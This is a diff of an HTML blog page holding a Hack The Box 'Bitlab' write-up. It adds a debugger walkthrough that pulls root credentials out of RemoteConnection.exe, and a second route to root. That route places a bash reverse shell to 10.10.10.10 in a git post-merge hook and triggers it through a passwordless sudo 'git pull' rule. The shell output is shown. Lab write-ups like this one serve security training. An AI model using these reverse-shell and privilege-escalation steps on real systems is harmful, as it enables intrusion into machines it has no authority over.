@@ -6,9 +6,8 @@
     
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="description" content="Table of contents    User flag.  Recon Web-shell as www-data Pivot www-data -&amp;gt; clave user   Root Flag  Recon Reverse engineering of RemoteConnection.exe       Bitlab box was an interesting box, user part was typical real-life scenario (actually meet this scenario during multiple pentests) while the root part was my first time Reverse Engineering.
-Tl;Dr: The user part needed you access a Gitlab instance by using credentials leaked by one of the developer."/>
-<meta name="keywords" content="hackthebox, ctf, bitlab, obfuscation, webshell, git, gitlab"/>
+<meta name="description" content="Table of contents    User flag.  Recon Web-shell as www-data Pivot www-data -&amp;gt; clave user   Root Flag  Recon Reverse engineering of RemoteConnection.exe   “Unintended” way to root     Bitlab box was an interesting box, user part was typical real-life scenario (actually meet this scenario during multiple pentests) while the root part was my first time Reverse Engineering."/>
+<meta name="keywords" content="hackthebox, ctf, bitlab, obfuscation, webshell, git, gitlab, git hook"/>
 <meta name="robots" content="noodp"/>
 <link rel="canonical" href="/posts/bitlab/" />
 
@@ -161,7 +160,7 @@ Alright! Let&amp;#39;s get into the details now!
 
       <span class="post-author">— Written by hg8</span>
       
-        <span class="post-read-time">— 7 min read</span>
+        <span class="post-read-time">— 11 min read</span>
       
     </div>
 
@@ -181,6 +180,8 @@ Alright! Let&amp;#39;s get into the details now!
           #<a href="/tags/git/">git</a>&nbsp;
         
           #<a href="/tags/gitlab/">gitlab</a>&nbsp;
+        
+          #<a href="/tags/git-hook/">git hook</a>&nbsp;
         
       </span>
     
@@ -214,6 +215,7 @@ Alright! Let&amp;#39;s get into the details now!
         <li><a href="#reverse-engineering-of-remoteconnectionexe">Reverse engineering of RemoteConnection.exe</a></li>
       </ul>
     </li>
+    <li><a href="#unintended-way-to-root">“Unintended” way to root</a></li>
   </ul>
 </nav>
 </details>
@@ -369,6 +371,122 @@ clave@bitlab:~$ cat user.txt
 clave@bitlab.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
 RemoteConnection.exe               100%   14KB 279.5KB/s   00:00
 </code></pre></div><h3 id="reverse-engineering-of-remoteconnectionexe">Reverse engineering of RemoteConnection.exe</h3>
+<p>Oddly enough I was able to make it work on <em>any</em> of my virtual machines. Tried Windows 7, 10, x32, x64 everything.</p>
+<p>Every time I got the following error message:</p>
+<blockquote>
+<p>EXCEPTION_ACCESS_VIOLATION</p>
+<p>Ntdll - Inaccesible Address</p>
+</blockquote>
+<p>So if anyone have any idea where this come from and how to fix please leave a comment.</p>
+<p>Anyway, I managed to borrow a Windows computer just to finish this box.</p>
+<p>The executable is 32-bit, running it display the following:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\hg8\&gt; .\RemoteConnection.exe
+Access Denied !! 
+</code></pre></div><h4 id="strings">Strings</h4>
+<p>Running <code>strings</code> on the file doesn&rsquo;t output a lot of valuable informations:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ strings RemoteConnection.exe
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+XRIBG0UCDh0HJRcIBh8EEk8aBwdQTAIERVIwFEQ4SDghJUsHJTw1TytWFkwPVgQ2RztS
+parse
+Access Denied !!
+string too long
+invalid string position
+GetUserNameW
+ShellExecuteW
+SHELL32.dll
+</code></pre></div><p>We can see <code>GetUserNameW</code> what <em>might</em> be used to retrieve the current Windows session username and <code>ShellExecuteW</code> which is a function to run external command.</p>
+<p>To get more information out of it I will use a debugger. This way maybe we can pull more valuable informations during runtime by reading the memory or even patching the binary to bypass the check leading to <code>Access Denied</code>.</p>
+<h4 id="debugging">Debugging</h4>
+<p>I will use <a href="https://x64dbg.com"><code>x32dbg</code></a> since it&rsquo;s free and open-source.</p>
+<p>After opening our binary we forward run once to arrive to the <code>RemoteConnection.exe</code> entry point:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/80528522-5907bb00-8996-11ea-9857-427940c42f1a.png" alt="remoteconnection.exe entry point"></p>
+<p>Now let&rsquo;s extract the referenced strings using the function provided by x32dbg:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/80528813-d0d5e580-8996-11ea-80e5-8f100149aaec.png" alt="remoteconnexion.exe bitlab strings"></p>
+<p>This is starting to get a bit more interesting. We have a reference to our previous user <code>clave</code> and a reference to <code>putty.exe</code>. Putty is a Windows terminal emulator often used to connect to server through SSH.</p>
+<p>If I could guess so far, the program check using <code>GetUserNameW</code> if the current user is <code>clave</code> and if so it will launch <code>putty.exe</code> using <code>ShellExecuteW</code> to automatically connect to, probably, the root account on Bitlab server. Unfortunately there is still no passwords in those referenced strings.</p>
+<p>Let&rsquo;s continue digging to see if we can either:</p>
+<ul>
+<li>Reverse the algorithm used to obfuscate the password.</li>
+<li>Patch the binary to launch putty even if the connected user is not <code>clave</code>.</li>
+<li>Read some other interesting strings from memory.</li>
+</ul>
+<p>To start off let&rsquo;s double-click the <code>L&quot;clave&quot;</code> to see where it&rsquo;s reference:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/80529378-ae909780-8997-11ea-9b67-1d56644cfa18.png" alt="clave cmp bitlab"></p>
+<p>Ok so looks like we are on the right track, we have a compare to the <code>clave</code> strings if the comparaison fail we jump to what is probably the <code>Access Denied !!</code> error message, while if the comparaison return true the function continue to the call of <code>putty.exe</code>.</p>
+<h4 id="breaking">Breaking</h4>
+<p>Let&rsquo;s put a breakpoint on the <code>clave</code> <code>cmp</code> line to see what&rsquo;s going on it memory. To do so click the grey circle on the left of the line to turn it red. Then let&rsquo;s forward once:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/80529782-42fafa00-8998-11ea-8bcc-5e13388f7ae5.png" alt="bitlab remoteconnexion.exe strings password"></p>
+<p>Bingo! Even at the moment of comparing the user the <code>eax</code> already contains the full command passed to Putty.</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/80529850-69b93080-8998-11ea-888c-cdb5253103bd.png" alt="bitlab root credentials remoteconnexion.exe"></p>
+<p>Let&rsquo;s use the those credentials to login to the root account using SSH:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh root@bitlab.htb
+root@bitlab.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
+Last login: Fri Sep <span style="color:#ae81ff">13</span> 14:11:14 <span style="color:#ae81ff">2019</span>
+root@bitlab:~# id
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+root@bitlab:~# cat root.txt
+8xxxxxxxxxxxxxxxxxxxxxxxxc
+</code></pre></div><h2 id="unintended-way-to-root">“Unintended” way to root</h2>
+<p>While having a shell as <code>www-data</code> we notice an unusual <code>sudo</code> configuration:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bitlab:/$ sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> www-data on bitlab:
+    env_reset, exempt_group<span style="color:#f92672">=</span>sudo, mail_badpass,
+    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+
+User www-data may run the following commands on bitlab:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/git pull
+</code></pre></div><p>This is used to automatically deploy projects to the server. The sudo is probably used to pull file where even if the permissions does not match.</p>
+<p>The Git documentation point an interesting fact about <code>git pull</code>:</p>
+<blockquote>
+<p>In its default mode, <code>git pull</code> is shorthand for <code>git fetch</code> followed by <code>git merge FETCH_HEAD</code>.</p>
+<p><a href="https://git-scm.com/docs/git-pull">https://git-scm.com/docs/git-pull</a></p>
+</blockquote>
+<p>That mean we have a <code>git merge</code> run as root. We can probably leverage this with a hook to achieve remote code execution as <code>root</code>. As a reminder:</p>
+<blockquote>
+<p>Hooks are programs you can place in a hooks directory to trigger actions at certain points in git’s execution.</p>
+<p><a href="https://git-scm.com/docs/githooks">https://git-scm.com/docs/githooks</a></p>
+</blockquote>
+<p>We are going to use a <a href="https://git-scm.com/docs/githooks#_post_merge"><code>post-merge</code></a> hook since it&rsquo;s going to be executed whenever a <code>git pull</code> is executed.</p>
+<p>Unfortunately neither <code>profile</code> nor <code>deployer</code> project can be directly written as <code>www-data</code>. That&rsquo;s not really a problem since we can simply copy the project to the <code>/tmp/</code> folder for example and be able to work on it:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bitlab:/$ cp -r /var/www/html/profile /tmp/.hg8
+www-data@bitlab:/$ cd /tmp/.hg8/profile/.git/hooks
+www-data@bitlab:/$ touch post-merge
+www-data@bitlab:/$ chmod +x post-merge
+</code></pre></div><p>Let&rsquo;s try to open a reverse shell as <code>root</code> using that hook. First let&rsquo;s create our reverse shell file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bitlab:/$ cat post-merge
+<span style="color:#75715e">#!/bin/bash</span>
+bash -i &gt;&amp; /dev/tcp/10.10.10.10/8585 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</code></pre></div><p>Then we open our listener:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
+Listening on any address <span style="color:#ae81ff">8585</span>
+</code></pre></div><p>Next step is to make a <code>sudo /usr/bin/git pull</code> to have our hook and reverse shell executed:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bitlab:/tmp/.hg8/profile$ sudo /usr/bin/git pull
+Already up to date.
+</code></pre></div><p>Ah yes, there is no change to the project, let&rsquo;s quickly go back to the Gitlab interface and commit a dummy file to <code>profile</code> project, then let&rsquo;s <code>git pull</code> again:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bitlab:/tmp/.hg8/profile$ sudo /usr/bin/git pull   
+remote: Enumerating objects: 1, <span style="color:#66d9ef">done</span>.
+remote: Counting objects: 100% <span style="color:#f92672">(</span>1/1<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+remote: Compressing objects: 100% <span style="color:#f92672">(</span>1/1<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+remote: Total <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>delta 1<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>delta 1<span style="color:#f92672">)</span>
+Unpacking objects: 100% <span style="color:#f92672">(</span>1/1<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+From ssh://localhost:3022/root/profile
+   34c4513..86773b8  master     -&gt; origin/master
+Updating 34c4513..86773b8
+Fast-forward
+ hg8 | <span style="color:#ae81ff">1</span> +
+ <span style="color:#ae81ff">1</span> file changed, <span style="color:#ae81ff">1</span> addition<span style="color:#f92672">(</span>+<span style="color:#f92672">)</span>
+</code></pre></div><p>And we get a new connection on our listener:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
+Listening on any address <span style="color:#ae81ff">8585</span>
+Connection from 10.10.10.114:40048
+$ id
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+$ cat root.txt
+8xxxxxxxxxxxxxxxxxxxxxxxxc
+</code></pre></div><hr>
+<p>As always do not hesitate to contact me for any questions or feedback.</p>
+<p>See you next time !</p>
+<p>-hg8</p>
 
     </div>
     
